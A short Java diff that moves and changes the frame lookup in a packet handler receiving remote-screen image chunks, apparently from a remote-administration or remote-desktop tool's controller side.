@@ -24,13 +24,13 @@ public class PacketRemoteScreenChunk extends AbstractIncomingPacket {
 		int y = slave.readInt();
 		int width = slave.readInt();
 		int height = slave.readInt();
-		
-		FrameRemoteScreen frame = FrameRemoteScreen.INSTANCES.get(slave);
 
 		int blen = slave.readInt();
 	
 		byte[] buffer = new byte[blen];
 		slave.getDataInputStream().readFully(buffer);
+
+        FrameRemoteScreen frame = (FrameRemoteScreen) slave.getFrame(FrameRemoteScreen.class);
 
 		if (frame != null) {
 			frame.setTransmitted(frame.getTransmitted() + blen);
